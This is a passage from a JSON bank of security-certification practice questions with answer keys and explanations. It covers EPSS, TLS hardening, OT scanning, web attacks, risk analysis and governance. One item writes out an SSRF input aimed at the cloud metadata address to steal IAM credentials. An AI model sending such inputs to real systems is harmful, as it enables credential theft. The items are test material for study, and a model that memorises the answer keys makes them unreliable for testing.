floods analysts with non-actionable noise, creating alert fatigue where analysts become desensitized and overlook genuine intrusions.","l":"c7-validate","l2":"","k":""},{"id":"lq:c7-validate:6","set":"lq","ch":7,"d":2,"q":"An analyst evaluates an Exploit Prediction Scoring System (EPSS) report for a newly published CVE. The report displays a score of 0.12 and a percentile of 88%. How should the analyst interpret these metrics?","o":["The vulnerability has an 88% chance of being exploited and ranks in the 12th percentile of severity","The vulnerability has a 12% probability of exploitation within 30 days and ranks higher than 88% of all CVEs","The vulnerability requires administrative privileges to exploit in 88% of operating system configurations","The vulnerability has been confirmed exploited in 12 enterprise networks over the past 88 days"],"a":1,"e":"EPSS score represents probability (0.12 = 12% chance of exploitation in the next 30 days). The percentile (88%) reflects its relative rank compared to all other CVEs in the database.","l":"c7-validate","l2":"","k":""},{"id":"lq:c7-validate:7","set":"lq","ch":7,"d":2,"q":"How does context awareness alter the operational risk evaluation of an internal database server compared to an external web portal affected by the same vulnerability?","o":["The internal server carries higher baseline risk because internal attackers are always more skilled","The external portal cannot be exploited without physical console access to the server room","The external portal has higher baseline risk because any internet attacker can reach it directly without prior internal network access","The internal database server is exempt from all vulnerability management compliance audits"],"a":2,"e":"External assets are exposed to untrusted traffic across the public internet, whereas exploiting internal assets requires an attacker to already possess an established network foothold.","l":"c7-validate","l2":"","k":""},{"id":"lq:c7-validate:8","set":"lq","ch":7,"d":2,"q":"A zero-day vulnerability is announced affecting a core enterprise web server. Vendor patches will not be available for at least two weeks. Which action should the security analyst take FIRST?","o":["Implement compensating controls such as WAF virtual patching, input filtering, or network isolation to mitigate exposure.","Wait for the official vendor security patch release before implementing any defensive technical or architectural changes.","Reclassify the vulnerability finding as a false positive in the SIEM to prevent SLA metric breaches.","Revert the production web server to a legacy unmaintained codebase that predates the vulnerability disclosure."],"a":0,"e":"When official vendor software patches are unavailable for an active zero-day flaw, security teams must immediately deploy compensating controls: implementing virtual patching via Web Application Firewall (WAF) inspection rules, tightening network access controls, disabling vulnerable modules, or isolating the service. Option B is the primary operational trap: waiting idly for a vendor patch leaves mission-critical systems completely defenseless during peak weaponization windows. Option C falsifies compliance metrics, and Option D re-introduces obsolete legacy vulnerabilities.","l":"c7-validate","l2":"","k":""},{"id":"lq:c7-server-network:1","set":"lq","ch":7,"d":2,"q":"A vulnerability scan report indicates that a production web server allows clients to negotiate the RC4 stream cipher and enables the SSLv3 protocol. Which action is the BEST remediation?","o":["Disable SSLv3 and RC4 on the server and enforce TLS 1.2 or TLS 1.3 with AES-GCM ciphers","Reissue the server SSL certificate using a 4096-bit RSA key while retaining current cipher suites","Implement an application-layer proxy that encapsulates SSLv3 traffic inside an unencrypted GRE tunnel","Configure HTTP Strict Transport Security (HSTS) with a max-age of zero to bypass cipher negotiation"],"a":0,"e":"SSLv3 and the RC4 stream cipher suffer from severe mathematical vulnerabilities (such as POODLE and plaintext recovery attacks). Remediation requires disabling legacy protocols and ciphers on the web server or load balancer and enforcing modern standards (TLS 1.2 or TLS 1.3) with authenticated encryption ciphers like AES-GCM. Reissuing certificates does not fix weak cipher suite negotiation, and setting HSTS max-age to zero disables HSTS protection.","l":"c7-server-network","l2":"","k":""},{"id":"lq:c7-server-network:2","set":"lq","ch":7,"d":2,"q":"An organization relies on an ancient database server running Windows Server 2003 to support a legacy manufacturing tool. Upgrading the operating system is impossible due to proprietary hardware constraints. Which compensating control provides the BEST security posture?","o":["Configure host-based firewall rules to permit unauthenticated administrative access across the local subnet","Isolate the server in a dedicated, microsegmented VLAN with zero internet routing and strict firewall rules","Configure periodic automated reboots to flush volatile memory and mitigate persistent malware","Install an endpoint detection agent in audit-only mode without network containment capabilities"],"a":1,"e":"When an end-of-life operating system cannot be upgraded or patched, isolating the host in a microsegmented VLAN with no outbound internet access and strict firewall access control lists (permitting only required ports from specific authorized management IPs) is the primary compensating control. Permitting broad subnet access increases risk, and reboots or audit-only agents do not prevent network exploitation.","l":"c7-server-network","l2":"","k":""},{"id":"lq:c7-server-network:3","set":"lq","ch":7,"d":2,"q":"A security analyst examines an exploit proof-of-concept targeting an application written in C. The exploit supplies 2,048 bytes of input to a 512-byte buffer, overwriting the function return pointer to point to shellcode. What vulnerability class is being exploited?","o":["Privilege escalation rootkit attack","Internal IP address disclosure","Stack-based buffer overflow","Heap-based memory allocation leak"],"a":2,"e":"A stack-based buffer overflow occurs when input exceeds buffer capacity on the function call stack, overwriting local variables and return address pointers to hijack program control flow.","l":"c7-server-network","l2":"","k":""},{"id":"lq:c7-server-network:4","set":"lq","ch":7,"d":2,"q":"An analyst reviews a vulnerability report for an external customer portal. The scanner flags an informational finding showing that HTTP 302 redirect responses include the header <code>Location: https://192.168.10.45/dashboard</code>. What security concern does this report expose?","o":["Cross-site scripting via unencoded user parameters","A certificate name mismatch between client and server","Remote code execution via web server buffer overflow","Internal RFC 1918 private IP address disclosure behind a NAT firewall"],"a":3,"e":"The web server is leaking its internal private RFC 1918 IP address (192.168.10.45) in HTTP redirect headers, providing external adversaries with internal network topology mapping data.","l":"c7-server-network","l2":"","k":""},{"id":"lq:c7-server-network:5","set":"lq","ch":7,"d":2,"q":"A mobile device management (MDM) platform reports that several smartphones carried by traveling sales staff have not received operating system security patches for over 90 days. Why were these vulnerabilities missed during scheduled enterprise network vulnerability scans?","o":["Mobile devices are frequently off the corporate network and not reachable during scheduled scan sweeps","Mobile operating systems enforce mandatory ASLR that blocks remote network vulnerability fingerprinting","Vulnerability scanners automatically abort port scans upon encountering mobile cellular carrier NAT gateways","Mobile device management agents require active directory domain controller binding to report OS patch levels"],"a":0,"e":"Network vulnerability scanners probe IP addresses present on corporate subnets during scheduled scanning windows. Mobile devices used by traveling or remote staff operate off-network or connect intermittently, making network-based scans blind to their presence. MDM agent-based reporting is required to assess mobile device patch compliance. ASLR does not prevent network scanning, and MDM solutions communicate via cloud APIs without AD binding.","l":"c7-server-network","l2":"","k":""},{"id":"lq:c7-server-network:6","set":"lq","ch":7,"d":2,"q":"A vulnerability scanner reports that a public-facing web server responds to the HTTP <code>DEBUG</code> method. What risk does this security misconfiguration pose?","o":["It enables remote unauthenticated attackers to execute arbitrary kernel shellcode via HTTP headers","It leaks detailed application architecture, database connection strings, and stack trace information to potential attackers","It causes client web browsers to bypass the Same-Origin Policy for cross-domain XML requests","It forces client endpoints to disable TLS session renegotiation and accept cleartext credentials"],"a":1,"e":"Enabling HTTP DEBUG allows attackers to send diagnostic requests that return verbose internal error messages, application source code paths, database connection strings, and stack traces. This information disclosure dramatically simplifies developing targeted application exploits. It does not cause kernel buffer overflows or disable browser origin policies.","l":"c7-server-network","l2":"","k":""},{"id":"lq:c7-server-network:7","set":"lq","ch":7,"d":2,"q":"When a user connects to a public airport Wi-Fi network and attempts to browse to a banking portal, the browser displays a certificate error stating the certificate presented belongs to <code>AirportWifiPortal.com</code> rather than the requested bank. What certificate error is occurring?","o":["Expired certificate validity period","Untrusted root Certificate Authority","Certificate name mismatch","Cryptographic cipher suite downgrade"],"a":2,"e":"A certificate name mismatch occurs when the server presents a certificate whose Common Name (CN) or Subject Alternative Name (SAN) does not match the URL hostname requested by the client.","l":"c7-server-network","l2":"","k":""},{"id":"lq:c7-server-network:8","set":"lq","ch":7,"d":2,"q":"An analyst discovers that system administrators are utilizing cleartext protocols over TCP port 21 to transfer database backups and TCP port 23 for remote server configuration. Which secure protocol combination should the analyst mandate?","o":["HTTPS for backup transfers and RDP with Network Level Authentication disabled for remote administration","TFTP over IPsec for configuration uploads and VNC over an unencrypted GRE tunnel","SCP for file transfers and SNMPv3 configured in noAuthNoPriv mode for remote administration","SFTP (or FTPS) for secure file transfers and SSH for encrypted remote administration"],"a":3,"e":"SFTP (SSH File Transfer Protocol) or FTPS (FTP over TLS) provides cryptographic confidentiality and integrity for file transfers, replacing cleartext FTP (port 21). SSH (Secure Shell, port 22) provides encrypted remote terminal management, replacing unencrypted Telnet (port 23). Disabling NLA on RDP weakens security, TFTP/GRE without authentication is insecure, and SNMPv3 noAuthNoPriv provides no encryption or authentication.","l":"c7-server-network","l2":"","k":""},{"id":"lq:c7-web-ot:1","set":"lq","ch":7,"d":2,"q":"A water utility's HMI displays normal pressure, but pumps are behaving abnormally and new PLC write commands appear in passive monitoring. What is the BEST conclusion?","o":["The readings may be process value spoofing","The HMI is experiencing reflected XSS","The historian has a normal baseline","The site is suffering credential stuffing"],"a":0,"e":"The combination of normal displayed values, abnormal physical behavior, and unexpected PLC writes suggests process value spoofing. XSS, stuffing, and a normal baseline do not explain the OT symptoms.","l":"c7-web-ot","l2":"","k":""},{"id":"lq:c7-web-ot:2","set":"lq","ch":7,"d":2,"q":"A newly hired security analyst suggests executing an aggressive, active vulnerability scan against programmable logic controllers (PLCs) on an operational municipal water distribution network. What is the BEST guidance for the senior security engineer to provide?","o":["Authorize the active scan immediately during normal business hours to ensure rapid discovery of exploitable vulnerabilities.","Utilize passive OT-aware network monitoring and coordinate any active testing strictly within scheduled maintenance windows.","Execute credentialed vulnerability scans exclusively across the field bus serial links rather than the Ethernet interface.","Deploy high-speed asynchronous port scanners throttled to 50,000 packets per second across the controller subnet."],"a":1,"e":"Industrial control systems and PLCs frequently run fragile embedded network stacks. Injecting active vulnerability scanner probes can crash controllers, corrupt ladder logic, or trigger fail-safe shutdowns, disrupting critical infrastructure. The approved approach mandates passive, OT-aware network monitoring (e.g., inspecting network TAP traffic with specialized OT tools) and restricting active assessments to scheduled, coordinated maintenance windows with engineers on standby. Option A is a catastrophic error that prioritizes testing over operational availability. Options C and D introduce aggressive active packets that destabilize sensitive physical processes.","l":"c7-web-ot","l2":"","k":""},{"id":"lq:c7-web-ot:3","set":"lq","ch":7,"d":2,"q":"A power generation plant must transmit real-time telemetry from an OT data historian to an enterprise corporate reporting dashboard, while strictly guaranteeing that no network packets or commands can physically traverse back into the OT network. Which control MUST be deployed?","o":["A stateful inspection perimeter firewall with deep packet inspection rules","An encrypted IPsec VPN tunnel utilizing mutual digital certificate authentication","A unidirectional security gateway (data diode) enforcing physical one-way data transmission","A reverse proxy terminating client TLS sessions and inspecting HTTP request headers"],"a":2,"e":"A unidirectional security gateway (data diode) uses physical hardware (an optical transmitter and photodiode receiver connected by a single fiber) to enforce strictly one-way data transmission at Layer 1. Historian metrics flow outward to the enterprise IT network, but physical hardware prevents any electrical or optical signal from returning to the OT network. Option A is tempting because firewalls filter traffic, but firewalls rely on bidirectional TCP handshakes and software rulebases that carry risk of misconfiguration or exploitation. Options B and D are bidirectional network technologies.","l":"c7-web-ot","l2":"","k":""},{"id":"lq:c7-web-ot:4","set":"lq","ch":7,"d":2,"q":"An attacker intercepts a web application request and changes the URL parameter from \"account_id=1042\" to \"account_id=1043\", successfully receiving the account balance and personal details of an unrelated customer. Which vulnerability does this exploit illustrate?","o":["Server-Side Request Forgery (SSRF)","Stored Cross-Site Scripting (XSS)","Remote File Inclusion (RFI)","Broken Object-Level Authorization (BOLA)"],"a":3,"e":"Broken Object-Level Authorization (BOLA, formerly known as Insecure Direct Object Reference or IDOR) occurs when an application exposes a reference to an internal object (such as an account number or record ID) without validating whether the authenticated user has authorization to access that specific object. Option A is tempting because an attacker alters request parameters, but SSRF tricks the web server into initiating unauthorized back-end requests to internal or cloud resources. Option B injects malicious client-side JavaScript into web pages, and Option C forces the server to execute malicious remote code files.","l":"c7-web-ot","l2":"","k":""},{"id":"lq:c7-web-ot:5","set":"lq","ch":7,"d":2,"q":"A web developer seeks the most effective, defense-in-depth architectural control to prevent SQL injection vulnerabilities across all database-driven application forms. What should the security analyst recommend FIRST?","o":["Parameterized queries (prepared statements) that separate SQL executable logic from user input","Client-side input validation scripts executed within the end user's web browser before form submission","Web Application Firewall (WAF) regex inspection rules deployed on the corporate reverse proxy","Database output encoding to sanitize HTML characters before returning query results to clients"],"a":0,"e":"Parameterized queries (prepared statements) are the primary defense against SQL injection. By pre-compiling the SQL statement and treating user-supplied input strictly as data parameters rather than executable SQL syntax, the database engine cannot be tricked into executing injected commands. Option B is the primary development trap: client-side validation is easily bypassed by submitting requests directly via Burp Suite or curl. Option C (WAF virtual patching) is a secondary detective/compensating control that attackers can often bypass with novel obfuscation. Option D defends against Cross-Site Scripting (XSS), not SQL injection.","l":"c7-web-ot","l2":"","k":""},{"id":"lq:c7-web-ot:6","set":"lq","ch":7,"d":2,"q":"A user is logged into an online banking portal. While the session remains active, the user clicks a malicious link on an external discussion forum that automatically triggers an unauthorized fund transfer using the user's existing session cookies. What attack was executed?","o":["Server-Side Request Forgery (SSRF)","Cross-Site Request Forgery (CSRF)","Cross-Site Scripting (XSS)","Session Fixation"],"a":1,"e":"Cross-Site Request Forgery (CSRF) abuses the trust that a web application places in an authenticated user's browser. By tricking the victim's browser into submitting an unauthorized HTTP request to the vulnerable site (which automatically includes stored session cookies), the server executes the action on the attacker's behalf. Option C is the most common distractor: XSS executes malicious JavaScript inside the victim's browser to steal tokens or modify DOM content, whereas CSRF forces the browser to perform an action using existing authentication credentials without executing script payloads inside the target site. Option A abuses server-side request functionality, and Option D forces a known session ID onto the user prior to login.","l":"c7-web-ot","l2":"","k":""},{"id":"lq:c7-web-ot:7","set":"lq","ch":7,"d":2,"q":"A web application features a PDF generation tool that accepts an image URL parameter and downloads the asset from the remote web server. An attacker passes the parameter \"http://169.254.169.254/latest/meta-data/\" and successfully extracts cloud IAM temporary role credentials. Which attack occurred?","o":["Server-Side Request Forgery (SSRF)","Cross-Site Request Forgery (CSRF)","Remote File Inclusion (RFI)","XML External Entity (XXE) injection"],"a":0,"e":"Server-Side Request Forgery (SSRF) occurs when a web application accepts a user-supplied URL and makes an HTTP request from the back-end server without adequate validation. In cloud environments, attackers use SSRF to query the link-local Instance Metadata Service (IMDS at 169.254.169.254) to steal temporary IAM security credentials attached to the host. Option B is the classic inversion trap: CSRF tricks the client browser into sending requests, whereas SSRF tricks the back-end server into making requests. Option C includes remote code files into application runtime execution, and Option D abuses XML parsers evaluating external entity references.","l":"c7-web-ot","l2":"","k":""},{"id":"lq:c7-web-ot:8","set":"lq","ch":7,"d":2,"q":"A single IP records one failed login for each of 30 different accounts within ten minutes. Which pattern is MOST likely?","o":["Credential stuffing","Session hijacking","On-path decryption","Password spraying"],"a":3,"e":"Spraying tries one or a few common passwords across many accounts. Stuffing replays many known username-password pairs, usually producing a different pattern.","l":"c7-web-ot","l2":"","k":""},{"id":"lq:c8-governance:1","set":"lq","ch":8,"d":2,"q":"A vulnerability exception record identifies a CVE and compensating firewall rule but has no expiration date. What is the MOST important gap?","o":["The review and expiration schedule","The policy hierarchy","The use of a guideline","The existence of an SLA"],"a":0,"e":"An exception must be time-limited and reviewed. Without an expiration and review schedule it can become undocumented permanent risk acceptance.","l":"c8-governance","l2":"","k":""},{"id":"lq:c8-governance:2","set":"lq","ch":8,"d":2,"q":"A legacy server cannot be patched for 60 days. Which action is BEST?","o":["Ignore the vulnerability until the next audit","Deploy segmentation and monitoring, document an approved exception, and plan the patch","Treat the compensating control as final remediation","Replace the security policy with a guideline"],"a":1,"e":"Compensating controls reduce interim risk, while the exception and remediation plan preserve accountability. They do not make the vulnerability disappear.","l":"c8-governance","l2":"","k":""},{"id":"lq:c8-governance:3","set":"lq","ch":8,"d":2,"q":"Which document should specify the required minimum TLS version for all customer-facing services?","o":["A guideline","A lessons-learned report","A standard","An incident ticket"],"a":2,"e":"A standard states a specific mandatory technical baseline. A guideline is advisory and the other documents serve different purposes.","l":"c8-governance","l2":"","k":""},{"id":"lq:c8-governance:4","set":"lq","ch":8,"d":2,"q":"A provider promises 99.999% uptime and offers service credits if it misses the target. What is the contract containing that promise?","o":["An SLO","An AUP","A risk register","An SLA"],"a":3,"e":"The uptime target is an SLO, but the formal agreement with consequences is an SLA.","l":"c8-governance","l2":"","k":""},{"id":"lq:c8-governance:5","set":"lq","ch":8,"d":2,"q":"A security manager wants to approve a policy exception for an unpatchable critical vulnerability discovered on a sensitive payment processing database. What is the BEST next step?","o":["Obtain formal documented approval from designated executive authority (such as the CISO) and record compensating controls","Grant a temporary verbal exception during the weekly change advisory meeting and defer written documentation","Reclassify the payment database as an out-of-scope development system in the asset inventory","Downgrade the technical policy mandate into an advisory guideline to eliminate the compliance non-conformity"],"a":0,"e":"Approval authority scales with risk. A critical vulnerability on a core sensitive asset requires formal sign-off from designated senior executive leadership (such as the CISO or CIO), backed by documented risk analysis, an expiration date, and verified compensating controls. Verbal approvals, asset manipulation, or downgrading mandatory policies into guidelines undermine governance and violate compliance frameworks.","l":"c8-governance","l2":"","k":""},{"id":"lq:c8-governance:6","set":"lq","ch":8,"d":2,"q":"A WAF blocks known exploit patterns against an unpatched application. How should the analyst classify the WAF?","o":["Direct remediation","A compensating control","A policy exception","A guideline"],"a":1,"e":"The WAF reduces exploitability but does not fix the application. It is a compensating control.","l":"c8-governance","l2":"","k":""},{"id":"lq:c8-governance:7","set":"lq","ch":8,"d":2,"q":"Leadership asks for a target that critical alerts be triaged within 15 minutes. What is this target?","o":["An SLA","A procedure","An SLO","A compensating control"],"a":2,"e":"An SLO is a measurable performance target. It may later be incorporated into an SLA.","l":"c8-governance","l2":"","k":""},{"id":"lq:c8-governance:8","set":"lq","ch":8,"d":2,"q":"During an active brute-force intrusion, a security analyst identifies an attacking IP address but is prevented by governance policies from modifying production perimeter firewall rules directly. What should the analyst do FIRST?","o":["Modify the firewall configuration via an undocumented local administrative shell to halt the threat immediately","Instruct the network engineering team to disable stateful packet inspection on the perimeter interface","Downgrade the incident severity rating in the ticketing platform until the next scheduled maintenance window","Use the approved emergency-change and escalation path to request immediate authorized rule deployment"],"a":3,"e":"Governance and change management policies exist to prevent unauthorized or untested alterations that could cause widespread production outages. When rapid action is required during an active incident, analysts must follow documented emergency-change or operational escalation paths to obtain rapid, authorized execution. Secretly making changes, disabling security engines, or lowering severity ratings violates governance and compromises operations.","l":"c8-governance","l2":"","k":""},{"id":"lq:c8-analyzing:1","set":"lq","ch":8,"d":2,"q":"A database has an expected annual loss of $50,000 before controls. New controls reduce expected annual loss to $8,000. What is the remaining $8,000 exposure called?","o":["Residual risk","Inherent risk","Exposure factor","Risk appetite"],"a":0,"e":"Residual risk is what remains after controls. Inherent risk is before controls, appetite is a leadership decision, and exposure factor is a percentage input.","l":"c8-analyzing","l2":"","k":""},{"id":"lq:c8-analyzing:2","set":"lq","ch":8,"d":2,"q":"An executive committee establishes that the organization will accept moderate security risks on low-value internal intranet services, but maintains a zero-tolerance policy for risks affecting customer payment databases. Which governance concept is leadership defining?","o":["Single Loss Expectancy (SLE)","Risk appetite","Annualized Rate of Occurrence (ARO)","Residual risk tolerance threshold"],"a":1,"e":"Risk appetite is the high-level, strategic determination set by executive leadership defining the amount and type of risk an organization is willing to pursue or accept in pursuit of its business objectives. Option D is tempting because tolerance relates to appetite, but risk tolerance represents the tactical, acceptable variance around a specific operational threshold, whereas the strategic board-level policy described is risk appetite. Options A and C are quantitative formula inputs (SLE and ARO) used to calculate Annualized Loss Expectancy (ALE).","l":"c8-analyzing","l2":"","k":""},{"id":"lq:c8-analyzing:3","set":"lq","ch":8,"d":2,"q":"A service loses $12,000 per outage and is expected to fail three times per year. What is its ALE?","o":["$4,000","$12,000","$36,000","$144,000"],"a":2,"e":"Assuming $12,000 is SLE, ALE equals SLE times ARO: $12,000 times 3 equals $36,000.","l":"c8-analyzing","l2":"","k":""},{"id":"lq:c8-analyzing:4","set":"lq","ch":8,"d":2,"q":"A SaaS vendor provides a SOC 2 Type II compliance report to support a new procurement contract. Upon review, the security analyst discovers that the audit report evaluates only the vendor's legacy HR software platform and completely excludes the cloud analytics platform the enterprise intends to purchase. What should the analyst do FIRST?","o":["Approve the vendor onboarding because possessing any current SOC 2 Type II report satisfies third-party compliance requirements.","Reject all cloud SaaS vendors and require internal engineering to construct an on-premises alternative.","Request an updated SOC 2 Type II report, SOC 3 summary, or official bridge letter specifically covering the scoped analytics service.","Convert the vendor's SOC 2 Type II report into a Type I self-attestation questionnaire to waive audit gaps."],"a":2,"e":"A third-party audit report is only valid if its boundary and scope match the specific services and infrastructure the enterprise intends to consume. If the report excludes the target cloud service, it provides zero assurance regarding that service's operational controls. The analyst must verify scope and request audit documentation (or a bridge letter) covering the specific product. Option A is the classic procurement trap: accepting a report without validating the scope leaves the organization exposed to unverified vendor security controls. Option B is an extreme overreaction, and Option D is nonsensical because organizations cannot unilaterally convert third-party CPA audit types.","l":"c8-analyzing","l2":"","k":""},{"id":"lq:c8-analyzing:5","set":"lq","ch":8,"d":2,"q":"During contract negotiations for an outsourced customer data management system, the third-party service provider explicitly refuses to agree to a mandatory \"right-to-audit\" clause. What is the BEST conclusion and course of action for the security analyst?","o":["Document the refusal as a high-risk finding and escalate to legal counsel and leadership for risk treatment or contractual negotiation.","Approve the contract immediately because third-party service providers are legally exempt from customer security audits.","Accept the contract without amendment because a vendor refusal automatically converts the agreement into a binding SLA.","Substitute the right-to-audit clause with a mutual non-disclosure agreement and finalize procurement without escalation."],"a":0,"e":"A \"right-to-audit\" clause grants an organization the contractual right to review an external vendor's security controls, independent audit reports, or physical facilities. When a vendor handling sensitive customer data refuses this clause, it strips the customer of independent validation mechanisms, representing a substantial third-party risk finding that must be formally documented and escalated to leadership and legal counsel. Option B is false because vendors regularly permit audits or provide independent third-party attestations (like SOC 2). Options C and D inappropriately bypass security governance and leave the organization legally unprotected.","l":"c8-analyzing","l2":"","k":""},{"id":"lq:c8-analyzing:6","set":"lq","ch":8,"d":2,"q":"A threat actor compromises the build server of a trusted enterprise network monitoring software vendor and injects a backdoor into a digitally signed routine software update delivered to 18,000 corporate clients. Which risk category BEST describes this threat?","o":["Shadow IT infrastructure adoption","Supply chain compromise","Insider threat data sabotage","Inherent regulatory non-compliance"],"a":1,"e":"A supply chain compromise (MITRE ATT&CK T1195) occurs when an adversary infiltrates an organization's systems indirectly by compromising a trusted third-party vendor, hardware supplier, or software update pipeline (as seen in the SolarWinds Orion breach). Option C is tempting because an actor modified code, but the intrusion was perpetrated by external adversaries exploiting a trusted supplier relationship rather than an internal employee. Options A and D do not describe malicious software tampering by external vendors.","l":"c8-analyzing","l2":"","k":""},{"id":"lq:c8-analyzing:7","set":"lq","ch":8,"d":2,"q":"A critical third-party cloud hosting provider storing an enterprise's primary financial database publicly announces that it suffered a major data breach involving unauthorized administrative console access yesterday. What is the MOST appropriate immediate Third-Party Risk Management (TPRM) action?","o":["Defer assessment activities until the provider's next scheduled annual questionnaire review cycle.","Remove the vendor from the corporate vendor inventory to eliminate regulatory breach notification liabilities.","Trigger an immediate event-driven security reassessment to evaluate internal exposure and request proof of containment.","Accept the vendor's previous SOC 2 Type II report as permanent proof that the current breach cannot impact enterprise data."],"a":2,"e":"A publicly confirmed security breach at a critical supplier is an urgent event trigger that requires an accelerated, out-of-cycle risk reassessment. The TPRM team must immediately determine whether organizational data was exposed, evaluate the vendor's containment evidence, review incident response communications, and assess whether regulatory breach notification timelines have been triggered. Option A is the dangerous complacency trap: waiting for an annual review cycle during an active supplier breach invites severe data loss and regulatory fines. Option B falsifies records, and Option D relies on historical audit reports that predate the active breach.","l":"c8-analyzing","l2":"","k":""},{"id":"lq:c8-analyzing:8","set":"lq","ch":8,"d":2,"q":"A Chief Information Security Officer (CISO) is presenting a newly discovered critical vulnerability on the corporate e-commerce database server to the Board of Directors. Which statement communicates this risk MOST effectively to executive stakeholders?","o":["The database server runs an unpatched version of Microsoft SQL Server exhibiting an unauthenticated buffer overflow flaw.","The vulnerability is classified under CVE-2026-1048 with a CVSS base vector score of 9.8 and an exploitability metric of 0.39.","The server currently accepts untrusted network packets across open TCP port 1433 without requiring TLS 1.3 encapsulation.","This vulnerability exposes confidential customer payment records, threatening severe regulatory fines, financial loss, and brand damage."],"a":3,"e":"Board members and executive leaders require risk communication framed in terms of business impact, financial liability, regulatory exposure, and operational disruption. Technical specifications (like buffer overflows, CVE numbers, CVSS vector strings, or open port numbers) belong in engineering discussions, not executive briefings. Options A, B, and C provide low-level technical minutiae that fail to explain what the vulnerability means to the organization's business survival.","l":"c8-analyzing","l2":"","k":""},{"id":"lq:c8-managing:1","set":"lq","ch":8,"d":2,"q":"A user denies making a configuration change. Immutable centralized logs identify the account and action. Which STRIDE category do those logs help address?","o":["Repudiation","Denial of service","Information disclosure","Spoofing"],"a":0,"e":"Immutable audit evidence addresses repudiation by preventing an actor from credibly denying the action. It does not directly prevent outage, disclosure, or identity impersonation.","l":"c8-managing","l2":"","k":""},{"id":"lq:c8-managing:2","set":"lq","ch":8,"d":2,"q":"A company removes an optional anonymous upload feature because the security risk outweighs its business value. Which strategy is this?","o":["Mitigation","Avoidance","Transfer","Acceptance"],"a":1,"e":"Removing the activity that creates the risk is avoidance. Mitigation would keep the feature and add controls.","l":"c8-managing","l2":"","k":""},{"id":"lq:c8-managing:3","set":"lq","ch":8,"d":2,"q":"Leadership reviews the cost of controls and formally decides to continue a low-value service without adding controls. What is this?","o":["Risk transfer","Risk avoidance","Risk acceptance","Threat reputation"],"a":2,"e":"A deliberate documented decision to live with risk is acceptance. Unreviewed inaction would be unmanaged risk.","l":"c8-managing","l2":"","k":""},{"id":"lq:c8-managing:4","set":"lq","ch":8,"d":2,"q":"An organization buys cyber insurance for losses from a DDoS attack. What does the insurance primarily do?","o":["Eliminate the DDoS vulnerability","Detect the attacker","Avoid the service risk","Transfer financial impact"],"a":3,"e":"Insurance transfers some financial consequences. It does not eliminate the threat or make the website immune.","l":"c8-managing","l2":"","k":""},{"id":"lq:c8-managing:5","set":"lq","ch":8,"d":2,"q":"An alert flags a user account with valid administrative credentials downloading sensitive financial databases at 3:00 AM from a workstation outside the user's assigned department. What is the BEST analysis approach?","o":["Correlate access logs across systems and compare the activity against the user's historical behavioral baseline","Close the alert as expected activity because the user successfully satisfied multi-factor authentication","Classify the event immediately as an unpatched zero-day exploit targeting network file shares","Revoke the user's domain credentials permanently and initiate external law enforcement referral before triaging"],"a":0,"e":"Insider threat and account takeover investigations require behavioral context: verifying whether the user normally works off-hours, whether their role justifies the access, and comparing current actions against established behavioral baselines. Valid MFA does not rule out compromised credentials or insider misuse, while jumping to zero-day conclusions or immediate unverified termination disrupts operations without evidence.","l":"c8-managing","l2":"","k":""},{"id":"lq:c8-managing:6","set":"lq","ch":8,"d":2,"q":"Threat actors exploit a previously undisclosed software vulnerability in an enterprise email server before the software vendor has developed or released a security patch. How is this threat condition MOST accurately categorized?","o":["Living-off-the-land exploit","Zero-day vulnerability","Supply chain dependency confusion","Heuristic evasion technique"],"a":1,"e":"A zero-day vulnerability is an undisclosed flaw unknown to the software vendor or public defenders, meaning zero days have passed since discovery and no vendor patch is available. Living-off-the-land utilizes legitimate built-in operating system tools, and dependency confusion exploits software package managers.","l":"c8-managing","l2":"","k":""},{"id":"lq:c8-managing:7","set":"lq","ch":8,"d":2,"q":"An incident response team extracts the cryptographic SHA-256 hash of a malicious payload executed on an endpoint during an active ransomware attack. How should this artifact be classified in the incident report?","o":["An Indicator of Attack (IoA)","A Threat Vulnerability Asset (TVA) rating","An Indicator of Compromise (IoC)","A Tactics, Techniques, and Procedures (TTP) signature"],"a":2,"e":"An Indicator of Compromise (IoC) is forensic evidence (such as a file hash, malicious IP address, or specific registry key) that indicates a system has already been compromised. An Indicator of Attack (IoA) focuses on real-time attacker intent and behavior (such as code injection or privilege escalation attempts) before or during the breach.","l":"c8-managing","l2":"","k":""},{"id":"lq:c8-managing:8","set":"lq","ch":8,"d":2,"q":"A threat model identifies an unauthenticated admin action that lets a user become an administrator. Which STRIDE category fits BEST?","o":["Tampering","Repudiation","Information disclosure","Elevation of privilege"],"a":3,"e":"Gaining authority beyond the user's authorization is elevation of privilege.","l":"c8-managing","l2":"","k":""},{"id":"lq:c8-controls:1","set":"lq","ch":8,"d":2,"q":"A vulnerability scan discovers a critical remote code execution vulnerability on an aging legacy operational server. The vendor ceased business operations five years ago, no software patch exists, and the server cannot be replaced for at least twelve months due to manufacturing dependencies. What is the BEST interim risk mitigation strategy?","o":["Implement network micro-segmentation, apply strict monitoring, document a formal risk exception, and define a replacement roadmap.","Execute automated active vulnerability scans every hour to continuously evaluate whether the exploit payload changes.","Close the vulnerability finding in the tracking platform because legacy systems are exempt from enterprise security baselines.","Suppress all security alert notifications across the server subnet until the hardware reaches end-of-life status."],"a":0,"e":"When vulnerabilities cannot be patched immediately due to legacy constraints or vendor abandonment, the proper response is applying compensating controls: isolating the system in a restricted micro-segment, placing strict ingress/egress firewall ACLs, enabling enhanced detection monitoring, and documenting an approved formal risk exception with an explicit review date and replacement plan. Option B risks crashing the legacy server with aggressive scanning without fixing the underlying flaw. Options C and D ignore risk and violate security compliance.","l":"c8-controls","l2":"","k":""},{"id":"lq:c8-controls:2","set":"lq","ch":8,"d":2,"q":"Which operational step MUST be completed before deploying a newly released operating system security patch into a live production enterprise environment?","o":["Deploy the patch directly to production domain controllers during peak business hours to ensure rapid coverage.","Validate the patch in a dedicated staging environment and prepare a documented, tested rollback plan.","Temporarily disable centralized endpoint logging and host-based intrusion detection agents to prevent installation conflicts.","Remove the affected production hosts from the configuration management database until the update succeeds."],"a":1,"e":"Before deploying patches to production, organizations must test updates in a representative staging or pre-production environment to ensure the patch does not degrade system functionality or break dependencies, and they must establish a tested rollback plan to restore services if unforeseen issues emerge in production. Option A violates change management procedures by deploying unverified patches during business hours. Options C and D blind security visibility and corrupt configuration inventory.","l":"c8-controls","l2":"","k":""},{"id":"lq:c8-controls:3","set":"lq","ch":8,"d":2,"q":"A researcher is invited to test only public company websites and report findings through a defined program. What is this?","o":["An internal audit","A configuration baseline","A bug bounty","A corrective control"],"a":2,"e":"A bug bounty authorizes external researchers to test in-scope internet-facing assets.","l":"c8-controls","l2":"","k":""},{"id":"lq:c8-controls:4","set":"lq","ch":8,"d":2,"q":"A firewall 